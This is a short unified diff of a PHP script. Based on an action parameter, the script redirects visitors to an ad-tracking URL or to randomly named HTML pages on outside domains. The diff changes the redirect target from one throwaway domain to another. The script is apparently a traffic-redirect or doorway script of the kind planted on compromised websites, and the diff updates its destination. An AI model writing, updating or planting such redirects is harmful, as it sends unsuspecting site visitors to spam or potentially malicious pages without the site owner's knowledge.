@@ -55,7 +55,7 @@
     header("Location: http://tracking.redirect.pub/ad/41bc9048?d=1");
   }else if($action == "site"){
     $filename = generate_name(rand(5,8)).".html";
-    header("Location:http://sonbkos.pw/".$filename);
+    header("Location:http://futunga.com/".$filename);
   } else if ($action == "theme"){
     require_once("shr.php");
 }
